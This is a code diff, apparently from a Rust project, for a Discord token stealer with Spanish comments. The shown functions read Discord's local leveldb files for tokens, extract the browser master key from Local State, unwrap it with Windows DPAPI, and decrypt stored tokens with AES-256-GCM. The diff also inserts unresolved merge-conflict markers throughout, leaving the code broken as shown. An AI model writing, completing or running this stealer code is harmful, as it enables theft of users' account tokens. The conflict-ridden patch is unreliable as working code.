@@ -72,7 +72,13 @@ fn extract_discord_tokens(
     if let Ok(entries) = fs::read_dir(&leveldb_path) {
         for entry in entries.flatten() {
             let path = entry.path();
+<<<<<<< HEAD
             let filename = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
+=======
+            let filename = path.file_name()
+                .and_then(|n| n.to_str())
+                .unwrap_or("");
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             if filename.ends_with(".log") || filename.ends_with(".ldb") {
                 if let Ok(content) = fs::read_to_string(&path) {
@@ -115,16 +121,26 @@ fn extract_discord_tokens(
 
 /// Extrae la master key del archivo Local State
 fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8>>> {
+<<<<<<< HEAD
     let content =
         fs::read_to_string(local_state_path).map_err(|e| StealerError::IoError(e.to_string()))?;
+=======
+    let content = fs::read_to_string(local_state_path)
+        .map_err(|e| StealerError::IoError(e.to_string()))?;
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if let Some(start) = content.find("\"encrypted_key\":\"") {
         let start_idx = start + 17;
         if let Some(end) = content[start_idx..].find("\"") {
             let base64_key = &content[start_idx..start_idx + end];
 
+<<<<<<< HEAD
             let encrypted_key =
                 base64_decode_simple(base64_key).map_err(|_| StealerError::Base64Error)?;
+=======
+            let encrypted_key = base64_decode_simple(base64_key)
+                .map_err(|_| StealerError::Base64Error)?;
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             if encrypted_key.len() > 5 && &encrypted_key[0..5] == b"DPAPI" {
                 let _encrypted_without_prefix = &encrypted_key[5..];
@@ -150,6 +166,10 @@ fn dpapi_decrypt(data: &[u8]) -> StealerResult<Vec<u8>> {
     use std::ptr;
     use winapi::um::dpapi::CryptUnprotectData;
     use winapi::um::wincrypt::DATA_BLOB;
+<<<<<<< HEAD
+=======
+    use std::ptr;
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     let mut data_in = DATA_BLOB {
         cbData: data.len() as u32,
@@ -205,9 +225,13 @@ fn extract_unencrypted_token(line: &str) -> Option<String> {
     // - MFA: mfa\.[\w-]{80,95}
 
     // Implementación simple sin regex (para evitar dependencia)
+<<<<<<< HEAD
     let words: Vec<&str> = line
         .split(|c: char| !c.is_alphanumeric() && c != '-' && c != '.')
         .collect();
+=======
+    let words: Vec<&str> = line.split(|c: char| !c.is_alphanumeric() && c != '-' && c != '.').collect();
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     for word in words {
         if word.len() >= 50 && word.contains('.') {
@@ -238,7 +262,12 @@ fn extract_unencrypted_token(line: &str) -> Option<String> {
 /// Desencripta un token de Discord encriptado
 fn decrypt_discord_token(encrypted_b64: &str, master_key: &[u8]) -> StealerResult<String> {
     // Decodificar Base64
+<<<<<<< HEAD
     let encrypted = base64_decode_simple(encrypted_b64).map_err(|_| StealerError::Base64Error)?;
+=======
+    let encrypted = base64_decode_simple(encrypted_b64)
+        .map_err(|_| StealerError::Base64Error)?;
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if encrypted.len() < 3 + 12 + 16 {
         return Err(StealerError::InvalidData);
@@ -252,6 +281,7 @@ fn decrypt_discord_token(encrypted_b64: &str, master_key: &[u8]) -> StealerResul
     let nonce_bytes = &encrypted[3..15];
     let ciphertext_with_tag = &encrypted[15..];
 
+<<<<<<< HEAD
     let cipher =
         Aes256Gcm::new_from_slice(master_key).map_err(|_| StealerError::DecryptionFailed)?;
 
@@ -262,6 +292,18 @@ fn decrypt_discord_token(encrypted_b64: &str, master_key: &[u8]) -> StealerResul
         .map_err(|_| StealerError::DecryptionFailed)?;
 
     String::from_utf8(plaintext).map_err(|_| StealerError::InvalidData)
+=======
+    let cipher = Aes256Gcm::new_from_slice(master_key)
+        .map_err(|_| StealerError::DecryptionFailed)?;
+
+    let nonce = Nonce::clone_from_slice(nonce_bytes);
+
+    let plaintext = cipher.decrypt(&nonce, ciphertext_with_tag)
+        .map_err(|_| StealerError::DecryptionFailed)?;
+
+    String::from_utf8(plaintext)
+        .map_err(|_| StealerError::InvalidData)
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 }
 
 /// Valida el formato de un token de Discord
